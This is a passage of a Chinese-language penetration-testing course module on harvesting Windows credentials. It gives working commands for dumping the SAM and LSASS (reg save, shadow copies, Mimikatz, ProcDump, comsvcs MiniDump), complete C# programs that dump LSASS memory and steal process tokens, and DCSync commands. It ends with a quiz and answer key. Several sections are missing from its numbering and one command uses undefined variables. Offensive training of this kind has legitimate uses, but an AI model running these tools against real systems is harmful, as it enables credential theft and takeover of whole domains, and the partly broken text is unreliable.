# Module 13: Windows 凭证获取

## Windows 凭证攻击技术

凭证获取是渗透测试中的关键环节，本章详细介绍 Windows 环境下的凭证获取技术。

---

## 一、Windows 凭证存储

### 1.1 凭证存储位置

```
Windows 凭证存储:

1. SAM 数据库
   位置: C:\Windows\System32\config\SAM
   内容: 本地用户密码哈希 (NTLM)
   保护: SYSTEM 权限才能访问

2. LSASS 进程
   进程: lsass.exe
   内容: 登录用户的凭证 (明文/哈希)
   保护: 需要 SYSTEM 或 Debug 权限

3. 域控制器 NTDS.dit
   位置: C:\Windows\NTDS\ntds.dit
   内容: 所有域用户的密码哈希
   保护: 只在域控制器上

4. 凭证管理器
   位置: 注册表/文件系统
   内容: 保存的密码
   保护: 用户级别加密

5. 组策略首选项 (GPP)
   位置: SYSVOL 共享
   内容: 可能包含加密的密码
   保护: 已知的加密密钥
```

### 1.2 凭证类型

| 类型 | 说明 | 用途 |
|------|------|------|
| NTLM Hash | NT 哈希 | Pass-the-Hash |
| Kerberos Ticket | TGT/ST | Pass-the-Ticket |
| 明文密码 | 原始密码 | 直接登录 |
| AES Key | Kerberos 密钥 | Kerberos 攻击 |

## 二、SAM 数据库攻击

### 2.1 离线提取 SAM

```powershell
# 方法 1: 使用 reg save (需要管理员权限)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# 方法 2: 使用卷影复制
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system

# 方法 3: 使用 PowerShell
# 需要 SYSTEM 权限
[System.IO.File]::Copy("C:\Windows\System32\config\SAM", "C:\temp\sam")
```

### 2.2 解密 SAM

```bash
# 使用 Impacket secretsdump
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 使用 samdump2
samdump2 system.hive sam.hive

# 输出格式
# Username:RID:LM_Hash:NT_Hash:::
```

### 2.3 在线提取 SAM

```powershell
# 使用 Mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# 使用 Invoke-Mimikatz
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
```

### 3.2 LSASS 内存转储

```powershell
# 方法 1: 任务管理器
# 右键 lsass.exe → 创建转储文件

# 方法 2: ProcDump
procdump.exe -ma lsass.exe lsass.dmp

[System.Diagnostics.Process]::Start("rundll32.exe", "C:\Windows\System32\comsvcs.dll, MiniDump $($process.Id) $path full")
```

### 3.4 MiniDumpWriteDump 实现

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

class LsassDumper
{
    [DllImport("dbghelp.dll", SetLastError = true)]
    static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint ProcessId,
        IntPtr hFile,
        uint DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    const uint MiniDumpWithFullMemory = 0x00000002;

    static void Main()
    {
        // 查找 LSASS 进程
        Process[] processes = Process.GetProcessesByName("lsass");
        if (processes.Length == 0)
        {
            Console.WriteLine("[-] LSASS not found");
            return;
        }

        int lsassPid = processes[0].Id;
        Console.WriteLine($"[+] LSASS PID: {lsassPid}");

        // 打开进程
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, lsassPid);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to open process");
            return;
        }

        // 创建转储文件
        string dumpPath = @"C:\temp\lsass.dmp";
        using (FileStream fs = new FileStream(dumpPath, FileMode.Create))
        {
            bool success = MiniDumpWriteDump(
                hProcess,
                (uint)lsassPid,
                fs.SafeFileHandle.DangerousGetHandle(),
                MiniDumpWithFullMemory,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero
            );

            if (success)
            {
                Console.WriteLine($"[+] Dump saved to: {dumpPath}");
            }
            else
            {
                Console.WriteLine("[-] Dump failed");
            }
        }
    }
}
```

## 四、访问令牌操作

### 4.1 令牌理论

```
访问令牌包含:
├── 用户 SID
├── 组 SID 列表
├── 特权列表
├── 完整性级别
└── 其他安全信息

令牌类型:
├── 主令牌 (Primary Token) - 进程使用
└── 模拟令牌 (Impersonation Token) - 线程使用

模拟级别:
├── Anonymous - 无法获取信息
├── Identification - 只能获取信息
├── Impersonation - 可以在本地模拟
└── Delegation - 可以在远程模拟
```

### 4.2 令牌窃取

```powershell
# 使用 Mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate           # 提升到 SYSTEM
mimikatz # token::elevate /domainadmin  # 模拟域管理员

# 列出令牌
mimikatz # token::list

# 模拟特定用户
mimikatz # token::impersonate /user:DOMAIN\Administrator
```

### 4.3 使用 Incognito

```powershell
# Meterpreter 中使用

meterpreter > list_tokens -u

# 独立工具
```

### 4.4 C# 令牌操作

```csharp
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

class TokenManipulation
{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    const uint TOKEN_ALL_ACCESS = 0xF01FF;

    static void StealToken(int targetPid)
    {
        // 打开目标进程
        IntPtr hProcess = OpenProcess(0x0400, false, targetPid);

        // 获取令牌
        IntPtr hToken;
        OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out hToken);

        // 复制令牌
        IntPtr hNewToken;
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out hNewToken);

        // 模拟用户
        ImpersonateLoggedOnUser(hNewToken);

        // 验证
        Console.WriteLine($"Current user: {WindowsIdentity.GetCurrent().Name}");
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
}
```

## 五、DCSync 攻击

### 5.1 DCSync 原理

```
DCSync 攻击:
- 模拟域控制器的复制行为
- 请求域用户的密码哈希
- 需要特定权限:
  - DS-Replication-Get-Changes
  - DS-Replication-Get-Changes-All
```

### 5.2 执行 DCSync

```powershell
# 使用 Mimikatz
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.com /all

# 使用 Impacket
python secretsdump.py corp.com/admin:password@DC01.corp.com -just-dc

# 使用 PowerView 检查权限
Get-DomainObjectAcl -Identity "DC=corp,DC=com" -ResolveGUIDs | ? {
    ($_.ObjectAceType -match "DS-Replication-Get-Changes") -and
    ($_.ActiveDirectoryRights -match "ExtendedRight")
}
```

## 七、章节测试

### 选择题

1. SAM 数据库存储的是什么？
   - A) 域用户密码
   - B) 本地用户密码哈希
   - C) Kerberos 票据
   - D) 明文密码

2. LSASS 进程包含什么信息？
   - A) 只有 NTLM 哈希
   - B) 登录用户的各种凭证
   - C) 只有 Kerberos 票据
   - D) 只有明文密码

3. DCSync 攻击需要什么权限？
   - A) 本地管理员
   - B) DS-Replication-Get-Changes
   - C) 域用户
   - D) SYSTEM

4. 以下哪个工具可以转储 LSASS？
   - A) Nmap
   - B) ProcDump
   - C) Burp Suite
   - D) Wireshark

5. 访问令牌的 Delegation 级别允许什么？
   - A) 只能获取信息
   - B) 只能在本地模拟
   - C) 可以在远程模拟
   - D) 无法使用

### 实践题

1. 描述从 LSASS 提取凭证的三种方法。

2. 解释 Pass-the-Hash 和 Pass-the-Ticket 的区别。

### 答案

**选择题**：1-B, 2-B, 3-B, 4-B, 5-C

**实践题参考答案**：

1. 从 LSASS 提取凭证的方法：
   - 使用 Mimikatz 直接读取 LSASS 内存
   - 使用 ProcDump/comsvcs.dll 创建内存转储，然后离线分析
   - 使用 MiniDumpWriteDump API 编写自定义工具

2. Pass-the-Hash vs Pass-the-Ticket：
   - Pass-the-Hash：使用 NTLM 哈希进行认证，适用于 NTLM 认证
   - Pass-the-Ticket：使用 Kerberos 票据进行认证，适用于 Kerberos 认证
   - PTH 更通用，PtT 更隐蔽
   - PTH 可能被检测，PtT 更难检测
